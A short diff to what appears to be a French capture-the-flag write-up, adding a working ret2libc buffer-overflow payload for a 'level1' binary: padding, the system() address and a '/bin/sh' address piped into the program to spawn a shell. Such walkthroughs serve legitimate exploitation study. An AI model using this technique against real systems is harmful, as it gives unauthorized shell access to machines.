@@ -21,3 +21,6 @@ On utilise "find the offset" de notre pattern generator, on a donc un segfault Ã
 On cherche l'adresse de la fonction system:
     info function system -> 0x08048360
     find &system,+9999999,"/bin/sh" -> 0xb7f8cc58
+
+python -c 'print "A"*76 + "\x60\x83\x04\x08" + "AAAA" + "\x58\xcc\xf8\xb7"' > /tmp/level1
+cat /tmp/level1 - | ./level1
